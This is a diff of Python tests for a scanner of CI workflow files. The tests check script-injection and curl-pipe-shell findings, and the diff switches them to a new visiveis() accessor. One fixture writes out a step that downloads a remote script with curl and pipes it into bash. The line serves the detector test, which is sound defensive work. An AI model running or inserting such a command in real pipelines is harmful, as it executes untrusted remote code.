@@ -27,7 +27,7 @@ def _scan_text(tmp_path: Path, text: str, name: str = "w.yml") -> ScanResult:
 
 
 def _injections(result: ScanResult) -> list[Finding]:
-    return [f for f in result.findings if f.check_id == "script-injection"]
+    return [f for f in result.visiveis() if f.check_id == "script-injection"]
 
 
 _RUN_INJECTION = textwrap.dedent("""\
@@ -123,13 +123,13 @@ def test_non_injection_finding_has_no_fix_suggestion(tmp_path: Path) -> None:
               - run: curl https://x.invalid/i.sh | bash
     """)
     result = _scan_text(tmp_path, wf)
-    curl = [f for f in result.findings if f.check_id == "curl-pipe-shell"]
+    curl = [f for f in result.visiveis() if f.check_id == "curl-pipe-shell"]
     assert curl and all(f.fix_suggestion is None for f in curl)
     assert not _injections(result)  # e não gerou script-injection espúrio
 
 
 def test_only_script_injection_carries_suggestion_in_mixed_repo(vuln_repo: Path) -> None:
-    findings = scan(vuln_repo).findings
+    findings = scan(vuln_repo).visiveis()
     with_suggestion = {f.check_id for f in findings if f.fix_suggestion is not None}
     assert with_suggestion == {"script-injection"}
     # e todo achado de script-injection realmente tem a sugestão (nenhum None esquecido).
